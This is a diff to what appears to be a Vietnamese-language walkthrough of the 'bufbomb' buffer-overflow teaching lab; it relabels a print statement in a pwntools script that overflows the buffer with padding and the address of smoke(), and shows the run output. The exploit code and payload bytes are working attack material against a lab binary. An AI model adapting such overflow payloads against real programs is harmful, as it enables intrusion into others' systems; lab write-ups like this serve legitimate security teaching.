@@ -99,7 +99,7 @@ exploit_payload = b'A'*(0x28 + 4)
 # lấy địa chỉ của hàm smoke() và thêm vào payload
 exploit_payload += p32(e.symbols['smoke'])
 
-print(exploit_payload)
+print(f"exploit payload: {exploit_payload}")
 
 # nhập payload vào tiến trình bufbomb
 io.sendline(exploit_payload)
@@ -140,7 +140,7 @@ Chạy script:
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 [+] Starting local process './bufbomb': pid 52
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xeb\x9a\x13\x80'
+exploit payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xeb\x9a\x13\x80'
 [*] Switching to interactive mode
 [*] Process './bufbomb' stopped with exit code 0 (pid 52)
 Userid: 09821978
